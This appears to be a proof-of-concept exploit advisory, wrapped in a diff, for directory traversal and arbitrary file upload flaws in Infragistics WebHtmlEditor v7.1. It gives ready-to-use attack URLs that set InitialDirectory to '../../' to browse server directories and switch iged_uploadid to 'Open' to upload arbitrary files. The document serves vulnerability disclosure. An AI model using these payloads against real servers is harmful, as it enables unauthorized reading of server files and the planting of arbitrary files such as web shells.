@@ -1,0 +1,50 @@
+-----------------------------------------------------------------------------------------------------------------------------
+Infragistics WebHtmlEditor.v7.1(InitialDirectory,iged_uploadid ) directory Traversal  and Arbitrary File upload vulnerability
+-----------------------------------------------------------------------------------------------------------------------------
+
+
+proof of concept by KyoungChip, Jang ( SpeeDr00t )
+
+[*] the bug    
+    : directory Traversal  and Arbitrary File upload vulnerability
+
+[*] application
+    : Infragistics WebHtmlEditor.v7.1
+
+[*] Vendor URL  
+    : http://www.infragistics.com
+
+
+[*] homepage
+    : cafe.naver.com/cwithme
+      
+[*] company
+    : sk &#1102;&#1085;4sec
+
+[*] Group
+    : canvasTeam@SpeeDr00t
+
+[*] Thank for
+    : my wife(en hee) , my son(ju en, do en ), Zero-0x77, hoon
+
+
+# directory Traversal  vulnerability
+
+A directory traversal vulnerability exists in Infragistics WebHtmlEditor.v7.1
+which allows a remote user to view files local to the target server.
+
+The parameters of the InitialDirectory ( InitialDirectory =../../ )
+This form of attack can be manipulated directory travel.
+
+poc ) InitialDirectory = ../../
+
+ex)
+http://server/test.aspx?lang=&iged_uploadid=InsertImage&LocalizationType=English&LocalizationFile=&InitialDirectory=../../&num=1&parentId=WebHtmlEditor
+
+
+# Arbitrary File upload vulnerability
+The parameters of the InsertImage the iged_uploadid can upload image files, but
+Open an attacker to change the parameters iged_uploadid Arbitrary File upload it enables.
+
+
+http://server/test.aspx?lang=&iged_uploadid=Open&LocalizationType=English&LocalizationFile=&InitialDirectory=../../&num=1&parentId=WebHtmlEditor
